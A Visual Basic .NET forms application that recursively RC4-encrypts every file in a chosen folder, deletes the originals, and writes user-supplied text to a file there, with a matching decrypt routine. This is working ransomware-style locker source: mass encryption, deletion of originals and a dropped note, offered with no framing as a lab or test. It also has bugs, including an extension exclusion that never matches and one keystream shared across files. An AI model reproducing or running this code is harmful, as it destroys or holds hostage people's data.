Imports System.IO
Imports Org.BouncyCastle.Crypto
Imports Org.BouncyCastle.Crypto.Parameters
Imports Org.BouncyCastle.Crypto.Engines
Public Class Form1

    Public Shared Sub EncryptDirectory(directoryPath As String, password As String, Optional excludedExtension As String = "", Optional maxFileSizeInBytes As Long = Long.MaxValue)
        Dim rc4 As New RC4Engine()
        Dim key As New KeyParameter(System.Text.Encoding.ASCII.GetBytes(password))
        rc4.Init(True, key)

        ' Get all files in the directory and its subdirectories
        Dim files As String() = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories)

        For Each filePath As String In files
            ' Check if the file should be excluded based on its extension
            If Path.GetExtension(filePath).ToLower() = excludedExtension.ToLower() Then
                Continue For ' Skip this file
            End If

            ' Check if the file should be excluded based on its size
            Dim fileInfo As New FileInfo(filePath)
            If fileInfo.Length > maxFileSizeInBytes Then
                Continue For ' Skip this file
            End If

            ' Encrypt the file content using RC4
            Dim fileBytes As Byte() = File.ReadAllBytes(filePath)
            Dim encryptedBytes(fileBytes.Length - 1) As Byte
            rc4.ProcessBytes(fileBytes, 0, fileBytes.Length, encryptedBytes, 0)

            ' Save the encrypted content to a new file with a different extension
            Dim newFilePath As String = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) & Path.GetExtension(filePath) & ".encrypted")
            File.WriteAllBytes(newFilePath, encryptedBytes)

            ' Delete the original file
            File.Delete(filePath)
        Next
    End Sub

    Public Shared Sub DecryptDirectory(directoryPath As String, password As String)
        Dim rc4 As New RC4Engine()
        Dim key As New KeyParameter(System.Text.Encoding.ASCII.GetBytes(password))
        rc4.Init(False, key)

        ' Get all encrypted files in the directory and its subdirectories
        Dim encryptedFiles As String() = Directory.GetFiles(directoryPath, "*.encrypted", SearchOption.AllDirectories)

        For Each filePath As String In encryptedFiles
            ' Decrypt the file content using RC4
            Dim encryptedBytes As Byte() = File.ReadAllBytes(filePath)
            Dim decryptedBytes(encryptedBytes.Length - 1) As Byte
            rc4.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, decryptedBytes, 0)

            ' Extract the original extension from the file name
            Dim originalExtension As String = Path.GetExtension(Path.GetFileNameWithoutExtension(filePath))

            ' Save the decrypted content to a new file with the original extension
            Dim newFilePath As String = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath))
            newFilePath = Path.ChangeExtension(newFilePath, originalExtension)
            File.WriteAllBytes(newFilePath, decryptedBytes)

            ' Delete the encrypted file
            File.Delete(filePath)
        Next
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim filePath As String = TextBox1.Text & "\" & TextBox3.Text
        DecryptDirectory(TextBox1.Text, TextBox4.Text)
        System.IO.File.Delete(filePath)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        EncryptDirectory(TextBox1.Text, TextBox4.Text, "ini", "30720000")
        'Directory, Key, Excluded Extension, Maximum Bytes before skipping

        Dim filePath As String = TextBox1.Text & "\" & TextBox3.Text
        Using writer As New StreamWriter(filePath)
            writer.Write(TextBox2.Text)
        End Using
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim folderBrowserDialog As New FolderBrowserDialog()

        If folderBrowserDialog.ShowDialog() = DialogResult.OK Then
            TextBox1.Text = folderBrowserDialog.SelectedPath
        End If
    End Sub

End Class
